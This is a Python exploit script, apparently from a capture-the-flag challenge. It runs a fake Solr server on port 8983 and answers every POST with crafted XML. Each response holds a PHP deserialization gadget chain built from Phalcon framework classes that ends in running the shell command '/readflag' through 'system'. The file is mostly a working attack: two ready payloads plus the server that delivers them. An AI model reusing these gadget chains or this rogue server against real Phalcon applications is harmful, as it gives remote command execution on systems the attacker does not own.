# !/usr/bin/env python3
# -*- coding: utf-8 -*-
# from: https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7

# built-in imports
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

Payload1 = """<?xml version="1.0" encoding="UTF-8"?>
<response>
<result name="response" numFound="1" start="0" numFoundExact="true">
  <doc name="test">
    <int name="a">123;i:0;O:29:"Phalcon\\Logger\\Adapter\\Stream":4:{s:13:"inTransaction";b:1;s:4:"name";s:8:"/tmp/abc";s:5:"queue";a:1:{i:1;O:10:"Phalcon\\Di":2:{s:13:"eventsManager";N;s:8:"services";a:1:{s:7:"message";O:18:"Phalcon\\Di\\Service":2:{s:6:"shared";b:0;s:10:"definition";a:3:{s:9:"className";s:18:"Phalcon\\Validation";s:9:"arguments";a:0:{}s:5:"calls";a:2:{i:0;a:2:{s:6:"method";s:3:"add";s:9:"arguments";a:2:{i:0;a:2:{s:4:"type";s:9:"parameter";s:5:"value";a:1:{i:0;s:0:"";}}i:1;a:2:{s:4:"type";s:9:"parameter";s:5:"value";O:37:"Phalcon\\Validation\\Validator\\Callback":1:{s:7:"options";a:2:{s:7:"message";s:0:"";s:8:"callback";s:6:"system";}}}}}i:1;a:2:{s:6:"method";s:8:"validate";s:9:"arguments";a:1:{i:0;a:2:{s:4:"type";s:9:"parameter";s:5:"value";O:21:"Phalcon\\Acl\\Component":1:{s:4:"name";s:9:"/readflag";}}}}}}}}}}s:9:"formatter";O:29:"Phalcon\\Logger\\Formatter\\Line":1:{s:6:"format";s:9:"%message%";}}}}}}}</int>
    <int name="b">0</int>
  </doc>
</result>
</response>\n"""

Payload2 = """<?xml version="1.0" encoding="UTF-8"?>
<response>
<result name="response" numFound="1" start="0" numFoundExact="true">
  <doc name="test">
    <int name="a">123;i:0;O:29:"Phalcon\\Logger\\Adapter\\Stream":4:{s:13:"inTransaction";b:1;s:4:"name";s:8:"/tmp/abc";s:5:"queue";a:1:{i:1;O:19:"Phalcon\\Logger\\Item":1:{s:7:"message";O:26:"Phalcon\\Forms\\Element\\Date":2:{s:4:"name";s:5:"write";s:4:"form";O:18:"Phalcon\\Validation":1:{s:6:"entity";O:40:"Phalcon\\DataMapper\\Pdo\\ConnectionLocator":1:{s:5:"write";a:1:{s:3:"key";a:2:{i:0;O:14:"Phalcon\\Loader":2:{s:20:"fileCheckingCallback";s:6:"system";s:5:"files";a:1:{i:0;s:9:"/readflag";}}i:1;s:9:"loadFiles";}}}}}}}s:9:"formatter";O:29:"Phalcon\\Logger\\Formatter\\Line":1:{s:6:"format";s:9:"%message%";}}}}}}}</int>
    <int name="b">0</int>
  </doc>
</result>
</response>\n"""


class Server(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        logging.info(f"Body:\n{post_data.decode()}\n")

        self._set_response()
        self.wfile.write(Payload1.encode())  # custom response content


def run(server_class=HTTPServer, handler_class=Server, port=8983):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        logging.info('Stopping httpd...\n')
    httpd.server_close()


if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
